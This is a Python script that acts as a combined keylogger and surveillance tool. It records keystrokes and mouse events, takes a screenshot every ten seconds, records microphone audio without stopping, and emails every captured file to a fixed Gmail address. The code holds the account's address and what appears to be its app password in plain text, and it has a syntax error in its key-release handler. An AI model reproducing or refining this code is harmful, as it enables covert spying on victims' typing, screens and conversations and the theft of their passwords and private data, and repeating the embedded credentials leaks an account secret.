import os
import sounddevice as sd
import soundfile as sf
import pyautogui
import threading
import time
from datetime import datetime
from pynput.keyboard import Listener as KeyListener
from pynput.mouse import Listener as MouseListener

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import ssl

recordings_folder = 'recordings'
screenshots_folder = 'screenshots'
keyandmouse_folder = 'key_mouse_logs'

smtp_port = 587
smtp_server = "smtp.gmail.com"
email_from = "rohitbarik194@gmail.com"
email_list = ["rohitbarik48@gmail.com"]
pswd = "czwa yqst xhjl xdzl"
subject = "Attachments"

def take_screenshot(folder, filename):
    if not os.path.exists(folder):
        os.makedirs(folder)
    filepath = os.path.join(folder, filename)
    pyautogui.screenshot(filepath)
    print(f'Screenshot saved as {filepath}')

def on_key_press(key):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        with open(os.path.join(keyandmouse_folder, 'keylog.txt'), 'a') as f:
            f.write(f'{timestamp}: {key.char} pressed\n')
    except AttributeError:
        with open(os.path.join(keyandmouse_folder, 'keylog.txt'), 'a') as f:
            f.write(f'{timestamp}: {key} pressed\n')

def on_key_release(key):
    if key=Key.esc:
        return False

def on_mouse_click(x, y, button, pressed):
    action = 'Pressed' if pressed else 'Released'
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(os.path.join(keyandmouse_folder, 'mouselog.txt'), 'a') as f:
        f.write(f'{timestamp}: {action} at ({x}, {y}) with {button}\n')

def on_mouse_move(x, y):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(os.path.join(keyandmouse_folder, 'mouselog.txt'), 'a') as f:
        f.write(f'{timestamp}: Mouse moved to ({x}, {y})\n')

def on_mouse_scroll(x, y, dy):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    direction = 'down' if dy < 0 else 'up'
    with open(os.path.join(keyandmouse_folder, 'mouselog.txt'), 'a') as f:
        f.write(f'{timestamp}: Scrolled {direction} at ({x}, {y})\n')

def record_audio(filename, duration, samplerate=44100, channels=2):
    try:
        audio_data = sd.rec(int(duration * samplerate), samplerate=samplerate, channels=channels, dtype='int16')
        sd.wait()
        sf.write(filename, audio_data, samplerate)
        print(f"Audio saved as {filename}")
    except Exception as e:
        print(f"Error recording audio: {e}")

def capture_screenshots(folder, interval_seconds):
    while True:
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        filename = f'screenshot_{timestamp}.png'
        take_screenshot(folder, filename)
        time.sleep(interval_seconds)

def continuous_audio_recording():
    while True:
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        audio_filename = os.path.join(recordings_folder, f'audio_{timestamp}.wav')
        record_audio(audio_filename, 10)

def send_email(email_list, attachments):
    context = ssl.create_default_context()
    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls(context=context)
            server.login(email_from, pswd)
            for recipient in email_list:
                msg = MIMEMultipart()
                msg['From'] = email_from
                msg['To'] = recipient
                msg['Subject'] = subject
                for attachment in attachments:
                    with open(attachment, 'rb') as file:
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload(file.read())
                        encoders.encode_base64(part)
                        part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(attachment)}"')
                        msg.attach(part)
                server.sendmail(email_from, recipient, msg.as_string())
            print(f"Email sent with {len(attachments)} attachment(s).")
    except Exception as e:
        print(f"An error occurred while sending the email: {e}")

def monitor_folders_and_send_emails(folder_paths):
    sent_files = set()
    while True:
        attachments = []
        for folder_path in folder_paths:
            if os.path.exists(folder_path) and os.path.isdir(folder_path):
                for root, _, files in os.walk(folder_path):
                    for filename in files:
                        file_path = os.path.join(root, filename)
                        if file_path not in sent_files:
                            attachments.append(file_path)
        if attachments and email_list:
            send_email(email_list, attachments)
            sent_files.update(attachments)
        time.sleep(10) 

if __name__ == "__main__":
    os.makedirs(recordings_folder, exist_ok=True)
    os.makedirs(screenshots_folder, exist_ok=True)
    os.makedirs(keyandmouse_folder, exist_ok=True)

    screenshot_thread = threading.Thread(target=capture_screenshots, args=(screenshots_folder, 10))
    screenshot_thread.start()

    audio_thread = threading.Thread(target=continuous_audio_recording)
    audio_thread.start()

    email_thread = threading.Thread(target=monitor_folders_and_send_emails, args=([recordings_folder, screenshots_folder, keyandmouse_folder],))
    email_thread.start()

    with KeyListener(on_press=on_key_press, on_release=on_key_release) as key_listener:
        with MouseListener(on_click=on_mouse_click, on_move=on_mouse_move, on_scroll=on_mouse_scroll) as mouse_listener:
            key_listener.join()
